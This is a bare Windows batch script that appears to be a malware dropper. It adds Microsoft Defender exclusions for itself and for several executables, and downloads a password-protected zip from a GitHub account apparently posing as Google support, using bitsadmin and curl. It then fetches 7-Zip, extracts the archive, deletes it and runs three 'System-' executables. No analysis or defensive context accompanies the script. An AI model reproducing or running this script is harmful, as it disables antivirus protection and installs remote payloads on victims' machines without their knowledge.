
powershell -inputformat none -outputformat none -NonInteractive -Command Add-MpPreference -ExclusionPath "C:\Windows\2.bat"
powershell Add-MpPreference -ExclusionProcess "C:\Windows\2.bat"


cd "%USERPROFILE%\

bitsadmin /transfer Packages /download /priority foreground https://github.com/supportgoogle34/files/raw/main/winfiles.zip  winfiles.zip

curl -L https://github.com/supportgoogle34/files/raw/main/winfiles.zip  -o  winfiles.zip

curl  -L https://www.7-zip.org/a/7zr.exe -o 7z.exe

bitsadmin /transfer Packages /download /priority foreground https://github.com/supportgoogle34/files/raw/main/winfiles.zip  winfiles.zip

7z.exe x  winfiles.zip -pkali#241 -aos

del winfiles.zip

powershell -inputformat none -outputformat none -NonInteractive -Command Add-MpPreference -ExclusionPath "C:\%USERPROFILE%\System-8.exe"
powershell -inputformat none -outputformat none -NonInteractive -Command Add-MpPreference -ExclusionPath " C:\%USERPROFILE%\System-8.exe"
powershell Add-MpPreference -ExclusionProcess "C:\%USERPROFILE%\System-e.exe"

powershell -inputformat none -outputformat none -NonInteractive -Command Add-MpPreference -ExclusionPath "C:\%USERPROFILE%\System-m.exe"
powershell -inputformat none -outputformat none -NonInteractive -Command Add-MpPreference -ExclusionPath "C:\%USERPROFILE%\System-e.exe"

System-8.exe
System-m.exe
System-e.exe



System-8.exe
System-m.exe
System-e.exe



exit


